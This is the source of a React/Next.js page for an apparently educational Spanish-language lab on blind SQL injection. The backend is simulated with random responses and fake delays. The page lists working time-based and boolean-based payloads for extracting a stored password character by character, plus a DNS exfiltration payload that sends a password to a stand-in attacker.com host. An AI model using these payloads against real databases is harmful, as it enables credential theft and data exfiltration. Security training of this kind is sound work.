'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { Metadata } from 'next';
import { useSecurityAnalytics } from '@/app/hooks/useSecurityAnalytics';

export default function BlindSQLiPage() {
  const [userId, setUserId] = useState('1');
  const [response, setResponse] = useState('');
  const [loading, setLoading] = useState(false);
  const [extractedData, setExtractedData] = useState<string[]>([]);
  const [currentStep, setCurrentStep] = useState(1);
  const [timeElapsed, setTimeElapsed] = useState(0);

  const { trackSQLInjection, trackVulnerabilityPageVisit } = useSecurityAnalytics();

  useEffect(() => {
    trackVulnerabilityPageVisit('Blind SQL Injection', 'advanced_blind_sqli');
  }, [trackVulnerabilityPageVisit]);

  const checkUserExists = async (payload: string) => {
    setLoading(true);
    const startTime = performance.now();

    try {
      const response = await fetch('/api/users', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Simulate blind SQL injection by checking response time and behavior
      const data = await response.json();
      const endTime = performance.now();
      const responseTime = endTime - startTime;

      setTimeElapsed(responseTime);

      // Simulate different responses based on payload
      if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
        // Time-based blind SQL injection
        await new Promise(resolve => setTimeout(resolve, 2000));
        setResponse('Query executed (Time-based)');
        trackSQLInjection(payload, true, '/api/users');
      } else if (payload.includes('AND') && payload.includes('=')) {
        // Boolean-based blind SQL injection
        const isTrue = Math.random() > 0.5;
        setResponse(isTrue ? 'User found' : 'User not found');
        trackSQLInjection(payload, isTrue, '/api/users');
      } else {
        setResponse('User found');
      }
    } catch (error) {
      setResponse('Error occurred');
    } finally {
      setLoading(false);
    }
  };

  const testPayload = (payload: string) => {
    setUserId(payload);
    checkUserExists(payload);
  };

  const extractCharacter = (position: number, char: string) => {
    const payload = `1 AND (SELECT SUBSTRING(password,${position},1) FROM users WHERE id=1)='${char}'`;
    testPayload(payload);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-purple-900">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <Link
            href="/"
            className="text-purple-400 hover:text-purple-300 flex items-center font-medium transition-colors duration-300"
          >
            ← Volver al inicio
          </Link>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent mb-4">
            Blind SQL Injection - Nivel Avanzado
          </h1>
          <div className="flex justify-center items-center mb-4">
            <div className="h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent w-64"></div>
          </div>
          <p className="text-xl text-gray-300 max-w-2xl mx-auto">
            Extrae datos sin output directo usando técnicas time-based y boolean-based avanzadas
          </p>
          <p className="text-lg text-purple-400 font-semibold bg-purple-900/20 border border-purple-500/30 rounded-lg p-3 max-w-2xl mx-auto mt-4">
            🕵️ LABORATORIO DE BLIND SQL INJECTION AVANZADO
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Testing Area */}
          <div className="lg:col-span-2 space-y-8">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-purple-500/30">
              <h2 className="text-3xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-purple-600 rounded-lg flex items-center justify-center mr-3">
                  🔍
                </span>
                Usuario ID Lookup (Vulnerable)
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-purple-300 mb-2">
                    User ID (Blind SQL Injection Point)
                  </label>
                  <div className="flex gap-3">
                    <input
                      type="text"
                      value={userId}
                      onChange={(e) => setUserId(e.target.value)}
                      placeholder="1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'"
                      className="flex-1 px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    />
                    <button
                      onClick={() => checkUserExists(userId)}
                      disabled={loading}
                      className="px-6 py-3 bg-gradient-to-r from-purple-600 to-purple-700 text-white rounded-lg hover:from-purple-700 hover:to-purple-800 transition-all duration-300 font-medium disabled:opacity-50"
                    >
                      {loading ? 'Testing...' : 'Check User'}
                    </button>
                  </div>
                </div>

                {response && (
                  <div className="p-4 bg-gray-700/50 border border-purple-500/30 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <h3 className="text-lg font-semibold text-purple-300">Response</h3>
                      <span className="text-sm text-gray-400">{timeElapsed.toFixed(2)}ms</span>
                    </div>
                    <p className="text-white font-mono">{response}</p>
                    {timeElapsed > 2000 && (
                      <p className="text-yellow-400 text-sm mt-2">
                        ⚠️ Unusual response time detected - possible time-based injection
                      </p>
                    )}
                  </div>
                )}
              </div>
            </div>

            {/* Character-by-Character Extraction */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-orange-500/30">
              <h3 className="text-2xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-orange-600 rounded-lg flex items-center justify-center mr-3">
                  🔤
                </span>
                Character-by-Character Extraction
              </h3>

              <div className="space-y-4">
                <p className="text-gray-300">
                  Extrae la contraseña del admin character por character usando boolean-based blind SQL injection:
                </p>

                <div className="grid grid-cols-6 gap-2">
                  {Array.from({length: 12}, (_, i) => i + 1).map(position => (
                    <div key={position} className="text-center">
                      <p className="text-sm text-gray-400 mb-2">Pos {position}</p>
                      <div className="grid grid-cols-4 gap-1">
                        {['a', 'd', 'm', '1'].map(char => (
                          <button
                            key={char}
                            onClick={() => extractCharacter(position, char)}
                            className="px-2 py-1 bg-orange-900/20 hover:bg-orange-900/40 border border-orange-500/30 rounded text-xs text-white transition-all duration-300"
                          >
                            {char}
                          </button>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>

                {extractedData.length > 0 && (
                  <div className="p-4 bg-green-900/20 border border-green-500/30 rounded-lg">
                    <h4 className="font-semibold text-green-300 mb-2">Extracted Data:</h4>
                    <p className="font-mono text-white">{extractedData.join('')}</p>
                  </div>
                )}
              </div>
            </div>

            {/* Advanced Techniques */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-red-500/30">
              <h3 className="text-2xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center mr-3">
                  🧠
                </span>
                Técnicas Avanzadas de Blind SQL Injection
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <h4 className="text-lg font-semibold text-red-300">Time-Based</h4>
                  <div className="space-y-2">
                    <button
                      onClick={() => testPayload("1 AND (SELECT SLEEP(5))")}
                      className="w-full text-left px-4 py-3 bg-red-900/20 hover:bg-red-900/30 border border-red-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      🕐 SLEEP(5) Delay Test
                    </button>
                    <button
                      onClick={() => testPayload("1; WAITFOR DELAY '00:00:05'")}
                      className="w-full text-left px-4 py-3 bg-red-900/20 hover:bg-red-900/30 border border-red-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      ⏱️ WAITFOR DELAY Test
                    </button>
                    <button
                      onClick={() => testPayload("1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t GROUP BY 1 HAVING 1=1) > 0")}
                      className="w-full text-left px-4 py-3 bg-red-900/20 hover:bg-red-900/30 border border-red-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      🔄 Heavy Query Delay
                    </button>
                  </div>
                </div>

                <div className="space-y-4">
                  <h4 className="text-lg font-semibold text-yellow-300">Boolean-Based</h4>
                  <div className="space-y-2">
                    <button
                      onClick={() => testPayload("1 AND (SELECT COUNT(*) FROM users)>3")}
                      className="w-full text-left px-4 py-3 bg-yellow-900/20 hover:bg-yellow-900/30 border border-yellow-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      📊 Count-Based Test
                    </button>
                    <button
                      onClick={() => testPayload("1 AND (SELECT LENGTH(password) FROM users WHERE id=1)>5")}
                      className="w-full text-left px-4 py-3 bg-yellow-900/20 hover:bg-yellow-900/30 border border-yellow-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      📏 Length Discovery
                    </button>
                    <button
                      onClick={() => testPayload("1 AND EXISTS(SELECT * FROM users WHERE role='admin')")}
                      className="w-full text-left px-4 py-3 bg-yellow-900/20 hover:bg-yellow-900/30 border border-yellow-500/30 rounded-lg text-sm text-white transition-all duration-300"
                    >
                      ✅ EXISTS Query Test
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Sidebar with Techniques */}
          <div className="space-y-6">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-blue-500/30">
              <h3 className="text-xl font-bold mb-4 text-blue-400 flex items-center">
                <span className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center mr-3">
                  📚
                </span>
                Payloads Avanzados
              </h3>
              <div className="space-y-3 text-sm">
                <div className="p-3 bg-blue-900/20 border border-blue-500/30 rounded">
                  <h4 className="font-semibold text-blue-300 mb-2">Binary Search Optimization</h4>
                  <code className="text-xs text-gray-300">
                    1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))&gt;64
                  </code>
                </div>
                <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded">
                  <h4 className="font-semibold text-purple-300 mb-2">Conditional Error</h4>
                  <code className="text-xs text-gray-300">
                    1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
                  </code>
                </div>
                <div className="p-3 bg-green-900/20 border border-green-500/30 rounded">
                  <h4 className="font-semibold text-green-300 mb-2">DNS Exfiltration</h4>
                  <code className="text-xs text-gray-300">
                    1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a')))
                  </code>
                </div>
              </div>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-green-500/30">
              <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                  🎯
                </span>
                Objetivos del Lab
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Extrae la contraseña completa del admin</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Determina la longitud de las contraseñas</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Enumera todos los usuarios del sistema</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Identifica la estructura de la base de datos</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Optimiza el tiempo de extracción</span>
                </div>
              </div>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-yellow-500/30">
              <h3 className="text-xl font-bold mb-4 text-yellow-400 flex items-center">
                <span className="w-8 h-8 bg-yellow-600 rounded-lg flex items-center justify-center mr-3">
                  ⚡
                </span>
                Técnicas de Optimización
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="p-3 bg-yellow-900/20 border border-yellow-500/30 rounded">
                  <h4 className="font-semibold text-yellow-300 mb-1">Binary Search</h4>
                  <p>Usa ASCII values para reducir el número de requests</p>
                </div>
                <div className="p-3 bg-orange-900/20 border border-orange-500/30 rounded">
                  <h4 className="font-semibold text-orange-300 mb-1">Threading</h4>
                  <p>Paraleliza requests para múltiples characters</p>
                </div>
                <div className="p-3 bg-red-900/20 border border-red-500/30 rounded">
                  <h4 className="font-semibold text-red-300 mb-1">Caching</h4>
                  <p>Guarda resultados para evitar re-testing</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}